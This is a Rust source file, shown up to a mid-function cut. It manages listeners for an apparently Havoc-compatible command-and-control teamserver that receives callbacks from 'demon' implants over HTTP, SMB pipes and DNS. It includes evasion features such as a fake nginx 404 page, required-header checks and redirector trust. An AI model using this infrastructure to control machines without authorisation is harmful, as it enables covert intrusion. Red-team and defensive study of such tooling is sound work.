//! Listener lifecycle management for the teamserver.

use std::collections::{BTreeMap, HashMap};
use std::future::Future;
use std::io;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::pin::Pin;
use std::sync::Arc;
use std::time::{Duration, Instant};

use axum::Router;
use axum::body::{Body, to_bytes};
use axum::extract::{ConnectInfo, State};
use axum::http::{HeaderMap, HeaderName, HeaderValue, Method, Request, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::any;
use axum_server::tls_rustls::RustlsConfig;
use interprocess::local_socket::tokio::Stream as LocalSocketStream;
use interprocess::local_socket::traits::tokio::Listener as _;
use interprocess::local_socket::{ListenerOptions, ToFsName as _, ToNsName as _};
#[cfg(unix)]
use interprocess::os::unix::local_socket::{AbstractNsUdSocket, FilesystemUdSocket};
#[cfg(windows)]
use interprocess::os::windows::local_socket::NamedPipe;
use red_cell_common::config::Profile;
use red_cell_common::demon::{DEMON_MAGIC_VALUE, DemonCommand, DemonEnvelope, DemonHeader};
use red_cell_common::operator::{
    EventCode, ListenerErrorInfo, ListenerInfo, ListenerMarkInfo, Message, MessageHead, NameInfo,
    OperatorMessage,
};
use red_cell_common::tls::{
    TlsKeyAlgorithm, install_default_crypto_provider, resolve_tls_identity,
};
use red_cell_common::{
    DnsListenerConfig, ExternalListenerConfig, HttpListenerConfig, HttpListenerProxyConfig,
    HttpListenerResponseConfig, ListenerConfig, ListenerProtocol, SmbListenerConfig,
};
use serde::{Deserialize, Serialize};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::net::UdpSocket;
use tokio::sync::{Mutex, RwLock};
use tokio::task::JoinHandle;
use tracing::{info, instrument, warn};
use utoipa::ToSchema;

use crate::{
    AgentRegistry, AuditResultStatus, CommandDispatchError, CommandDispatcher, Database,
    DemonPacketParser, ListenerRepository, ListenerStatus, ParsedDemonPacket, PersistedListener,
    PersistedListenerState, PluginRuntime, ShutdownController, SocketRelayManager, TeamserverError,
    agent_events::agent_new_event, audit_details, build_init_ack, build_reconnect_ack,
    events::EventBus, json_error_response, parameter_object, record_operator_action,
};

const DEFAULT_MAX_DOWNLOAD_BYTES: u64 = 512 * 1024 * 1024;
const MAX_DEMON_INIT_ATTEMPTS_PER_IP: u32 = 5;
const DEMON_INIT_WINDOW_DURATION: Duration = Duration::from_secs(60);
const MAX_DEMON_INIT_ATTEMPT_WINDOWS: usize = 10_000;
const EXTRA_METHOD: &str = "Method";
const EXTRA_BEHIND_REDIRECTOR: &str = "BehindRedirector";
const EXTRA_TRUSTED_PROXY_PEERS: &str = "TrustedProxyPeers";
const EXTRA_CERT_PATH: &str = "Cert";
const EXTRA_KEY_PATH: &str = "Key";
const EXTRA_RESPONSE_BODY: &str = "ResponseBody";
const EXTRA_KILL_DATE: &str = "KillDate";
const EXTRA_WORKING_HOURS: &str = "WorkingHours";

#[derive(Clone, Debug, Default)]
struct DemonInitRateLimiter {
    windows: Arc<Mutex<HashMap<IpAddr, DemonInitAttemptWindow>>>,
}

#[derive(Clone, Copy, Debug)]
struct DemonInitAttemptWindow {
    accepted_attempts: u32,
    window_start: Instant,
}

impl Default for DemonInitAttemptWindow {
    fn default() -> Self {
        Self { accepted_attempts: 0, window_start: Instant::now() }
    }
}

impl DemonInitRateLimiter {
    #[must_use]
    fn new() -> Self {
        Self::default()
    }

    async fn allow(&self, ip: IpAddr) -> bool {
        let mut windows = self.windows.lock().await;
        let now = Instant::now();

        prune_expired_demon_init_windows(&mut windows, now);
        if !windows.contains_key(&ip) && windows.len() >= MAX_DEMON_INIT_ATTEMPT_WINDOWS {
            evict_oldest_demon_init_windows(&mut windows, MAX_DEMON_INIT_ATTEMPT_WINDOWS / 2);
        }

        let window = windows.entry(ip).or_default();
        if now.duration_since(window.window_start) >= DEMON_INIT_WINDOW_DURATION {
            window.accepted_attempts = 0;
            window.window_start = now;
        }

        if window.accepted_attempts >= MAX_DEMON_INIT_ATTEMPTS_PER_IP {
            return false;
        }

        window.accepted_attempts += 1;
        true
    }

    #[cfg(test)]
    async fn tracked_ip_count(&self) -> usize {
        self.windows.lock().await.len()
    }
}

fn prune_expired_demon_init_windows(
    windows: &mut HashMap<IpAddr, DemonInitAttemptWindow>,
    now: Instant,
) {
    windows
        .retain(|_, window| now.duration_since(window.window_start) < DEMON_INIT_WINDOW_DURATION);
}

fn evict_oldest_demon_init_windows(
    windows: &mut HashMap<IpAddr, DemonInitAttemptWindow>,
    target_size: usize,
) {
    if windows.len() <= target_size {
        return;
    }

    let to_remove = windows.len() - target_size;
    let mut entries: Vec<_> =
        windows.iter().map(|(ip, window)| (*ip, window.window_start)).collect();
    entries.sort_unstable_by_key(|(_, window_start)| *window_start);
    for (ip, _) in entries.into_iter().take(to_remove) {
        windows.remove(&ip);
    }
}

/// Runtime state for a configured listener.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
pub struct ListenerSummary {
    /// Unique listener name.
    pub name: String,
    /// Listener transport protocol.
    pub protocol: ListenerProtocol,
    /// Persisted runtime state.
    pub state: PersistedListenerState,
    /// Full listener configuration.
    pub config: ListenerConfig,
}

impl From<PersistedListener> for ListenerSummary {
    fn from(value: PersistedListener) -> Self {
        Self {
            name: value.name,
            protocol: value.protocol,
            state: value.state,
            config: value.config,
        }
    }
}

impl ListenerSummary {
    /// Convert the summary into the Havoc-compatible operator payload shape.
    #[must_use]
    pub fn to_operator_info(&self) -> ListenerInfo {
        let mut info = ListenerInfo {
            name: Some(self.name.clone()),
            protocol: Some(operator_protocol_name(&self.config)),
            status: Some(operator_status(self.state.status).to_owned()),
            ..ListenerInfo::default()
        };

        match &self.config {
            ListenerConfig::Http(config) => {
                info.extra
                    .insert("Host".to_owned(), serde_json::Value::String(config.host_bind.clone()));
                info.extra.insert(
                    "Port".to_owned(),
                    serde_json::Value::String(config.port_bind.to_string()),
                );
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.uris.join(", ")));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.hosts = Some(config.hosts.join(", "));
                info.host_bind = Some(config.host_bind.clone());
                info.host_rotation = Some(config.host_rotation.clone());
                info.port_bind = Some(config.port_bind.to_string());
                info.port_conn = config.port_conn.map(|value| value.to_string());
                info.headers = Some(config.headers.join(", "));
                info.uris = Some(config.uris.join(", "));
                info.user_agent = config.user_agent.clone();
                if let Some(host_header) = &config.host_header {
                    info.extra.insert(
                        "HostHeader".to_owned(),
                        serde_json::Value::String(host_header.clone()),
                    );
                }
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_METHOD,
                    config.method.as_deref(),
                );
                info.extra.insert(
                    EXTRA_BEHIND_REDIRECTOR.to_owned(),
                    serde_json::Value::String(config.behind_redirector.to_string()),
                );
                if !config.trusted_proxy_peers.is_empty() {
                    info.extra.insert(
                        EXTRA_TRUSTED_PROXY_PEERS.to_owned(),
                        serde_json::Value::String(config.trusted_proxy_peers.join(", ")),
                    );
                }
                info.proxy_enabled =
                    Some(config.proxy.as_ref().is_some_and(|proxy| proxy.enabled).to_string());
                info.proxy_type = config.proxy.as_ref().and_then(|proxy| proxy.proxy_type.clone());
                info.proxy_host = config.proxy.as_ref().map(|proxy| proxy.host.clone());
                info.proxy_port = config.proxy.as_ref().map(|proxy| proxy.port.to_string());
                info.proxy_username =
                    config.proxy.as_ref().and_then(|proxy| proxy.username.clone());
                info.proxy_password =
                    config.proxy.as_ref().and_then(|proxy| proxy.password.clone());
                info.secure = Some(config.secure.to_string());
                info.response_headers = config.response.as_ref().and_then(|response| {
                    (!response.headers.is_empty()).then(|| response.headers.join(", "))
                });
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_CERT_PATH,
                    config.cert.as_ref().map(|cert| cert.cert.as_str()),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_KEY_PATH,
                    config.cert.as_ref().map(|cert| cert.key.as_str()),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_RESPONSE_BODY,
                    config.response.as_ref().and_then(|response| response.body.as_deref()),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_KILL_DATE,
                    config.kill_date.as_deref(),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_WORKING_HOURS,
                    config.working_hours.as_deref(),
                );
            }
            ListenerConfig::Smb(config) => {
                info.extra.insert("Host".to_owned(), serde_json::Value::String(String::new()));
                info.extra.insert("Port".to_owned(), serde_json::Value::String(String::new()));
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.pipe_name.clone()));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.extra.insert(
                    "PipeName".to_owned(),
                    serde_json::Value::String(config.pipe_name.clone()),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_KILL_DATE,
                    config.kill_date.as_deref(),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_WORKING_HOURS,
                    config.working_hours.as_deref(),
                );
            }
            ListenerConfig::External(config) => {
                info.extra.insert("Host".to_owned(), serde_json::Value::String(String::new()));
                info.extra.insert("Port".to_owned(), serde_json::Value::String(String::new()));
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.endpoint.clone()));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.extra.insert(
                    "Endpoint".to_owned(),
                    serde_json::Value::String(config.endpoint.clone()),
                );
            }
            ListenerConfig::Dns(config) => {
                info.extra
                    .insert("Host".to_owned(), serde_json::Value::String(config.host_bind.clone()));
                info.extra.insert(
                    "Port".to_owned(),
                    serde_json::Value::String(config.port_bind.to_string()),
                );
                info.extra
                    .insert("Info".to_owned(), serde_json::Value::String(config.domain.clone()));
                info.extra.insert(
                    "Error".to_owned(),
                    self.state.last_error.clone().map_or_else(
                        || serde_json::Value::String(String::new()),
                        serde_json::Value::String,
                    ),
                );
                info.extra
                    .insert("Domain".to_owned(), serde_json::Value::String(config.domain.clone()));
                info.extra.insert(
                    "RecordTypes".to_owned(),
                    serde_json::Value::String(config.record_types.join(",")),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_KILL_DATE,
                    config.kill_date.as_deref(),
                );
                insert_optional_extra_string(
                    &mut info.extra,
                    EXTRA_WORKING_HOURS,
                    config.working_hours.as_deref(),
                );
                info.host_bind = Some(config.host_bind.clone());
                info.port_bind = Some(config.port_bind.to_string());
            }
        }

        info
    }
}

/// Request body used by REST listener mark operations.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
pub struct ListenerMarkRequest {
    /// Requested mark value such as `start` or `stop`.
    pub mark: String,
}

/// Errors returned by [`ListenerManager`].
#[derive(Debug, thiserror::Error)]
pub enum ListenerManagerError {
    /// Listener persistence failed.
    #[error("{0}")]
    Database(#[from] TeamserverError),
    /// The requested listener already exists.
    #[error("listener `{name}` already exists")]
    DuplicateListener { name: String },
    /// The requested listener could not be found.
    #[error("listener `{name}` not found")]
    ListenerNotFound { name: String },
    /// The listener is already running.
    #[error("listener `{name}` is already running")]
    ListenerAlreadyRunning { name: String },
    /// The listener is not currently running.
    #[error("listener `{name}` is not running")]
    ListenerNotRunning { name: String },
    /// The operator payload could not be converted into a valid listener config.
    #[error("invalid listener configuration: {message}")]
    InvalidConfig { message: String },
    /// A listener runtime could not bind or initialize.
    #[error("failed to start listener `{name}`: {message}")]
    StartFailed { name: String, message: String },
    /// The WebSocket mark command used an unsupported action.
    #[error("unsupported listener mark `{mark}`")]
    UnsupportedMark { mark: String },
}

impl IntoResponse for ListenerManagerError {
    fn into_response(self) -> Response {
        let status = match self {
            Self::DuplicateListener { .. } => StatusCode::CONFLICT,
            Self::ListenerNotFound { .. } => StatusCode::NOT_FOUND,
            Self::ListenerAlreadyRunning { .. } | Self::ListenerNotRunning { .. } => {
                StatusCode::CONFLICT
            }
            Self::InvalidConfig { .. } | Self::UnsupportedMark { .. } => StatusCode::BAD_REQUEST,
            Self::StartFailed { .. } => StatusCode::UNPROCESSABLE_ENTITY,
            Self::Database(_) => StatusCode::INTERNAL_SERVER_ERROR,
        };

        json_error_response(status, "listener_error", self.to_string())
    }
}

/// Tracks persisted listeners and their active runtime tasks.
#[derive(Clone, Debug)]
pub struct ListenerManager {
    database: Database,
    agent_registry: AgentRegistry,
    events: EventBus,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    max_download_bytes: u64,
    demon_init_rate_limiter: DemonInitRateLimiter,
    shutdown: ShutdownController,
    active_handles: Arc<RwLock<BTreeMap<String, JoinHandle<()>>>>,
    operations: Arc<Mutex<()>>,
}

impl ListenerManager {
    /// Build a listener manager backed by `database`.
    #[must_use]
    pub fn new(
        database: Database,
        agent_registry: AgentRegistry,
        events: EventBus,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
    ) -> Self {
        Self::with_max_download_bytes(
            database,
            agent_registry,
            events,
            sockets,
            plugins,
            DEFAULT_MAX_DOWNLOAD_BYTES,
        )
    }

    /// Build a listener manager backed by `database` with a custom per-download memory cap.
    #[must_use]
    pub fn with_max_download_bytes(
        database: Database,
        agent_registry: AgentRegistry,
        events: EventBus,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        max_download_bytes: u64,
    ) -> Self {
        Self {
            database,
            agent_registry,
            events,
            sockets,
            plugins,
            max_download_bytes,
            demon_init_rate_limiter: DemonInitRateLimiter::new(),
            shutdown: ShutdownController::new(),
            active_handles: Arc::new(RwLock::new(BTreeMap::new())),
            operations: Arc::new(Mutex::new(())),
        }
    }

    /// Return the listener persistence repository used by the manager.
    #[must_use]
    pub fn repository(&self) -> ListenerRepository {
        self.database.listeners()
    }

    /// Return the in-memory agent registry used by active listeners.
    #[must_use]
    pub fn agent_registry(&self) -> AgentRegistry {
        self.agent_registry.clone()
    }

    /// Return the shared graceful-shutdown controller used by listener runtimes.
    #[must_use]
    pub fn shutdown_controller(&self) -> ShutdownController {
        self.shutdown.clone()
    }

    /// Enter shutdown mode, wait for tracked callbacks to drain, then stop active listeners.
    pub async fn shutdown(&self, timeout: Duration) -> bool {
        self.shutdown.initiate();
        let drained = self.shutdown.wait_for_callback_drain(timeout).await;

        let names: Vec<_> = self.active_handles.read().await.keys().cloned().collect();
        for name in names {
            let _ = self.stop(&name).await;
        }

        drained
    }

    /// Create a persisted listener configuration in the stopped state.
    #[instrument(skip(self, config), fields(listener_name = %config.name(), protocol = ?config.protocol()))]
    pub async fn create(
        &self,
        config: ListenerConfig,
    ) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        self.create_locked(config).await
    }

    async fn create_locked(
        &self,
        config: ListenerConfig,
    ) -> Result<ListenerSummary, ListenerManagerError> {
        let repository = self.repository();
        ensure_listener_creation_supported(&config)?;

        if repository.exists(config.name()).await? {
            return Err(ListenerManagerError::DuplicateListener { name: config.name().to_owned() });
        }

        repository.create(&config).await?;
        self.summary(config.name()).await
    }

    /// Replace an existing listener configuration.
    #[instrument(skip(self, config), fields(listener_name = %config.name(), protocol = ?config.protocol()))]
    pub async fn update(
        &self,
        config: ListenerConfig,
    ) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        self.update_locked(config).await
    }

    async fn update_locked(
        &self,
        config: ListenerConfig,
    ) -> Result<ListenerSummary, ListenerManagerError> {
        let repository = self.repository();
        ensure_listener_creation_supported(&config)?;
        let existing = repository.get(config.name()).await?.ok_or_else(|| {
            ListenerManagerError::ListenerNotFound { name: config.name().to_owned() }
        })?;

        let was_running = existing.state.status == ListenerStatus::Running;
        if was_running {
            self.stop_locked(config.name()).await?;
        }

        repository.update(&config).await?;
        repository.set_state(config.name(), ListenerStatus::Stopped, None).await?;

        if was_running {
            match self.start_locked(config.name()).await {
                Ok(summary) => return Ok(summary),
                Err(error) => return Err(error),
            }
        }

        self.summary(config.name()).await
    }

    /// Start the named listener runtime.
    #[instrument(skip(self), fields(listener_name = %name))]
    pub async fn start(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        self.start_locked(name).await
    }

    /// Stop the named listener runtime.
    #[instrument(skip(self), fields(listener_name = %name))]
    pub async fn stop(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let _guard = self.operations.lock().await;
        self.stop_locked(name).await
    }

    /// Delete the named listener, stopping it first if needed.
    #[instrument(skip(self), fields(listener_name = %name))]
    pub async fn delete(&self, name: &str) -> Result<(), ListenerManagerError> {
        let _guard = self.operations.lock().await;
        let repository = self.repository();
        let Some(listener) = repository.get(name).await? else {
            return Err(ListenerManagerError::ListenerNotFound { name: name.to_owned() });
        };

        if listener.state.status == ListenerStatus::Running {
            let _ = self.stop_locked(name).await?;
        }

        repository.delete(name).await?;
        self.active_handles.write().await.remove(name);
        Ok(())
    }

    /// Return the current persisted summary for `name`.
    #[instrument(skip(self), fields(listener_name = %name))]
    pub async fn summary(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        self.repository()
            .get(name)
            .await?
            .map(Into::into)
            .ok_or_else(|| ListenerManagerError::ListenerNotFound { name: name.to_owned() })
    }

    /// Return every persisted listener summary.
    #[instrument(skip(self))]
    pub async fn list(&self) -> Result<Vec<ListenerSummary>, ListenerManagerError> {
        Ok(self.repository().list().await?.into_iter().map(Into::into).collect())
    }

    /// Reconcile persisted listeners against the YAOTL profile.
    #[instrument(skip(self, profile))]
    pub async fn sync_profile(&self, profile: &Profile) -> Result<(), ListenerManagerError> {
        let _guard = self.operations.lock().await;
        let repository = self.repository();
        let profile_listeners = profile_listener_configs(profile)
            .into_iter()
            .map(|config| (config.name().to_owned(), config))
            .collect::<BTreeMap<_, _>>();

        for name in repository.names().await? {
            if !profile_listeners.contains_key(&name) {
                self.delete_removed_profile_listener_locked(&name).await?;
            }
        }

        for config in profile_listeners.into_values() {
            match self.create_locked(config.clone()).await {
                Ok(_) => {}
                Err(ListenerManagerError::DuplicateListener { .. }) => {
                    let _ = self.update_locked(config).await?;
                }
                Err(error) => return Err(error),
            }
        }

        Ok(())
    }

    /// Start listeners that were last persisted in the running state.
    #[instrument(skip(self))]
    pub async fn restore_running(&self) -> Result<(), ListenerManagerError> {
        let listeners = self.repository().list().await?;

        for listener in listeners {
            if listener.state.status == ListenerStatus::Running {
                match self.start(&listener.name).await {
                    Ok(_) => {}
                    Err(error) if is_ignored_restore_start_failure(&listener.config, &error) => {}
                    Err(error) => return Err(error),
                }
            }
        }

        Ok(())
    }

    async fn start_locked(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let repository = self.repository();
        let listener = repository
            .get(name)
            .await?
            .ok_or_else(|| ListenerManagerError::ListenerNotFound { name: name.to_owned() })?;
        self.prune_finished_handle(name).await;
        if self.active_handles.read().await.contains_key(name) {
            return Err(ListenerManagerError::ListenerAlreadyRunning { name: name.to_owned() });
        }

        match self.spawn_listener_runtime(&listener.config).await {
            Ok(handle) => {
                self.active_handles.write().await.insert(name.to_owned(), handle);
                repository.set_state(name, ListenerStatus::Running, None).await?;
                info!(listener = name, protocol = %listener.protocol, "listener started");
                self.summary(name).await
            }
            Err(error) => {
                let error_text = error.to_string();
                repository
                    .set_state(name, ListenerStatus::Error, Some(error_text.as_str()))
                    .await?;
                warn!(listener = name, error = %error_text, "listener failed to start");
                Err(ListenerManagerError::StartFailed {
                    name: name.to_owned(),
                    message: error_text,
                })
            }
        }
    }

    async fn stop_locked(&self, name: &str) -> Result<ListenerSummary, ListenerManagerError> {
        let repository = self.repository();

        if repository.get(name).await?.is_none() {
            return Err(ListenerManagerError::ListenerNotFound { name: name.to_owned() });
        }

        let Some(handle) = self.active_handles.write().await.remove(name) else {
            return Err(ListenerManagerError::ListenerNotRunning { name: name.to_owned() });
        };

        handle.abort();
        let _ = handle.await;
        repository.set_state(name, ListenerStatus::Stopped, None).await?;
        info!(listener = name, "listener stopped");
        self.summary(name).await
    }

    async fn prune_finished_handle(&self, name: &str) {
        let should_remove = {
            let handles = self.active_handles.read().await;
            handles.get(name).is_some_and(JoinHandle::is_finished)
        };

        if should_remove {
            self.active_handles.write().await.remove(name);
        }
    }

    async fn delete_removed_profile_listener_locked(
        &self,
        name: &str,
    ) -> Result<(), ListenerManagerError> {
        if let Some(handle) = self.active_handles.write().await.remove(name) {
            handle.abort();
            let _ = handle.await;
        }

        self.repository().delete(name).await?;
        info!(listener = name, "removed persisted listener absent from profile");

        Ok(())
    }
}

fn spawn_managed_listener_task(
    name: String,
    runtime: ListenerRuntimeFuture,
    repository: ListenerRepository,
    active_handles: Arc<RwLock<BTreeMap<String, JoinHandle<()>>>>,
) -> JoinHandle<()> {
    tokio::spawn(async move {
        let outcome = runtime.await;
        active_handles.write().await.remove(&name);

        match outcome {
            Ok(()) => {
                if let Err(error) = repository.set_state(&name, ListenerStatus::Stopped, None).await
                {
                    warn!(
                        listener = %name,
                        %error,
                        "listener runtime exited but stopped state could not be persisted"
                    );
                } else {
                    info!(listener = %name, "listener runtime exited");
                }
            }
            Err(message) => {
                if let Err(error) =
                    repository.set_state(&name, ListenerStatus::Error, Some(message.as_str())).await
                {
                    warn!(
                        listener = %name,
                        runtime_error = %message,
                        %error,
                        "listener runtime failed and error state could not be persisted"
                    );
                } else {
                    warn!(listener = %name, error = %message, "listener runtime exited with error");
                }
            }
        }
    })
}

const DEFAULT_FAKE_404_BODY: &str =
    "<html><head><title>404 Not Found</title></head><body>404 Not Found</body></html>";
const DEFAULT_HTTP_METHOD: &str = "POST";
const MINIMUM_DEMON_CALLBACK_BYTES: usize = DemonHeader::SERIALIZED_LEN + 8;
const SMB_PIPE_PREFIX: &str = r"\\.\pipe\";
const MAX_SMB_FRAME_PAYLOAD_LEN: usize = 16 * 1024 * 1024;
const MAX_AGENT_REQUEST_BODY_LEN: usize = 0x01E0_0000; // ~30 MiB — matches DEMON_MAX_RESPONSE_LENGTH
const HEADER_VALIDATION_IGNORES: [&str; 2] = ["connection", "accept-encoding"];
type ListenerRuntimeFuture = Pin<Box<dyn Future<Output = ListenerRuntimeResult> + Send>>;
type ListenerRuntimeResult = Result<(), String>;

#[derive(Clone, Debug)]
struct HttpListenerState {
    config: HttpListenerConfig,
    trusted_proxy_peers: Vec<TrustedProxyPeer>,
    registry: AgentRegistry,
    database: Database,
    parser: DemonPacketParser,
    events: EventBus,
    dispatcher: CommandDispatcher,
    demon_init_rate_limiter: DemonInitRateLimiter,
    method: Method,
    required_headers: Vec<ExpectedHeader>,
    response_headers: Vec<(HeaderName, HeaderValue)>,
    response_body: Arc<[u8]>,
    default_fake_404_body: Arc<[u8]>,
    shutdown: ShutdownController,
}

#[derive(Clone, Debug)]
struct ExpectedHeader {
    name: HeaderName,
    expected_value: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum TrustedProxyPeer {
    Address(IpAddr),
    Network(TrustedProxyNetwork),
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct TrustedProxyNetwork {
    network: IpAddr,
    prefix_len: u8,
}

#[derive(Clone, Debug)]
struct SmbListenerState {
    config: SmbListenerConfig,
    registry: AgentRegistry,
    database: Database,
    parser: DemonPacketParser,
    events: EventBus,
    dispatcher: CommandDispatcher,
    demon_init_rate_limiter: DemonInitRateLimiter,
    shutdown: ShutdownController,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ProcessedDemonResponse {
    agent_id: u32,
    payload: Vec<u8>,
    http_disposition: DemonHttpDisposition,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum DemonTransportKind {
    Init,
    Reconnect,
    Callback,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum DemonHttpDisposition {
    Ok,
    Fake404,
}

impl HttpListenerState {
    #[allow(clippy::too_many_arguments)]
    fn build(
        config: &HttpListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        demon_init_rate_limiter: DemonInitRateLimiter,
        shutdown: ShutdownController,
        max_download_bytes: u64,
    ) -> Result<Self, ListenerManagerError> {
        let method = parse_method(config)?;
        let trusted_proxy_peers = config
            .trusted_proxy_peers
            .iter()
            .map(|value| parse_trusted_proxy_peer(value, &config.name))
            .collect::<Result<Vec<_>, _>>()?;
        let required_headers = config
            .headers
            .iter()
            .filter_map(|header| parse_expected_header(header, &config.name).transpose())
            .collect::<Result<Vec<_>, _>>()?;
        let response_headers = config
            .response
            .as_ref()
            .map_or(Ok(Vec::new()), |response| parse_response_headers(response, &config.name))?;
        let response_body = config
            .response
            .as_ref()
            .and_then(|response| response.body.as_deref())
            .unwrap_or_default()
            .as_bytes()
            .to_vec()
            .into();

        Ok(Self {
            config: config.clone(),
            trusted_proxy_peers,
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::new(registry.clone()),
            dispatcher: CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
                registry.clone(),
                events.clone(),
                database.clone(),
                sockets,
                plugins,
                max_download_bytes,
            ),
            events,
            demon_init_rate_limiter,
            method,
            required_headers,
            response_headers,
            response_body,
            default_fake_404_body: DEFAULT_FAKE_404_BODY.as_bytes().to_vec().into(),
            shutdown,
        })
    }

    fn fake_404_response(&self) -> Response {
        let body = if self.response_body.is_empty() {
            self.default_fake_404_body.clone()
        } else {
            self.response_body.clone()
        };

        let mut response =
            build_response(StatusCode::NOT_FOUND, body.as_ref(), &self.response_headers);
        let headers = response.headers_mut();
        set_default_header(headers, "server", "nginx");
        set_default_header(headers, "content-type", "text/html");
        set_default_header(headers, "x-havoc", "true");
        response
    }

    fn callback_empty_response(&self) -> Response {
        build_response(StatusCode::OK, &[], &self.response_headers)
    }

    fn callback_bytes_response(&self, body: &[u8]) -> Response {
        build_response(StatusCode::OK, body, &self.response_headers)
    }
}

impl SmbListenerState {
    #[allow(clippy::too_many_arguments)]
    fn build(
        config: &SmbListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        demon_init_rate_limiter: DemonInitRateLimiter,
        shutdown: ShutdownController,
        max_download_bytes: u64,
    ) -> Self {
        Self {
            config: config.clone(),
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::new(registry.clone()),
            events: events.clone(),
            demon_init_rate_limiter,
            shutdown,
            dispatcher: CommandDispatcher::with_builtin_handlers_and_max_download_bytes(
                registry.clone(),
                events.clone(),
                database,
                sockets,
                plugins,
                max_download_bytes,
            ),
        }
    }
}

/// Convert a Havoc operator listener payload into a shared listener config.
pub fn listener_config_from_operator(
    info: &ListenerInfo,
) -> Result<ListenerConfig, ListenerManagerError> {
    let name = required_field("Name", info.name.as_deref())?;
    let protocol = required_field("Protocol", info.protocol.as_deref())?;

    match ListenerProtocol::try_from_str(protocol) {
        Ok(ListenerProtocol::Http) => Ok(ListenerConfig::from(HttpListenerConfig {
            name: name.to_owned(),
            kill_date: optional_extra_string(info, EXTRA_KILL_DATE),
            working_hours: optional_extra_string(info, EXTRA_WORKING_HOURS),
            hosts: split_csv(info.hosts.as_deref()),
            host_bind: required_field("HostBind", info.host_bind.as_deref())?.to_owned(),
            host_rotation: required_field("HostRotation", info.host_rotation.as_deref())?
                .to_owned(),
            port_bind: parse_u16("PortBind", info.port_bind.as_deref())?,
            port_conn: parse_optional_u16("PortConn", info.port_conn.as_deref())?,
            method: optional_extra_string(info, EXTRA_METHOD),
            behind_redirector: parse_extra_bool(info, EXTRA_BEHIND_REDIRECTOR)?,
            trusted_proxy_peers: split_csv(extra_value_as_str(info, EXTRA_TRUSTED_PROXY_PEERS)),
            user_agent: optional_trimmed(info.user_agent.as_deref()),
            headers: split_csv(info.headers.as_deref()),
            uris: split_csv(info.uris.as_deref()),
            host_header: info
                .extra
                .get("HostHeader")
                .and_then(serde_json::Value::as_str)
                .and_then(|value| optional_trimmed(Some(value))),
            secure: parse_bool("Secure", info.secure.as_deref())?,
            cert: tls_config_from_operator(info),
            response: http_response_from_operator(info),
            proxy: proxy_from_operator(info)?,
        })),
        Ok(ListenerProtocol::Smb) => Ok(ListenerConfig::from(SmbListenerConfig {
            name: name.to_owned(),
            pipe_name: required_extra_string(info, "PipeName")?,
            kill_date: optional_extra_string(info, EXTRA_KILL_DATE),
            working_hours: optional_extra_string(info, EXTRA_WORKING_HOURS),
        })),
        Ok(ListenerProtocol::External) => Ok(ListenerConfig::from(ExternalListenerConfig {
            name: name.to_owned(),
            endpoint: required_extra_string(info, "Endpoint")?,
        })),
        Ok(ListenerProtocol::Dns) => Ok(ListenerConfig::from(DnsListenerConfig {
            name: name.to_owned(),
            host_bind: info
                .host_bind
                .as_deref()
                .and_then(|value| optional_trimmed(Some(value)))
                .unwrap_or_else(|| "0.0.0.0".to_owned()),
            port_bind: parse_u16("PortBind", info.port_bind.as_deref())?,
            domain: required_extra_string(info, "Domain")?,
            record_types: split_csv(
                info.extra.get("RecordTypes").and_then(serde_json::Value::as_str),
            ),
            kill_date: optional_extra_string(info, EXTRA_KILL_DATE),
            working_hours: optional_extra_string(info, EXTRA_WORKING_HOURS),
        })),
        Err(error) => Err(ListenerManagerError::InvalidConfig { message: error.to_string() }),
    }
}

/// Return `true` when the operator payload requests the listener be started immediately.
#[must_use]
pub fn operator_requests_start(info: &ListenerInfo) -> bool {
    info.status.as_deref().is_some_and(|status| {
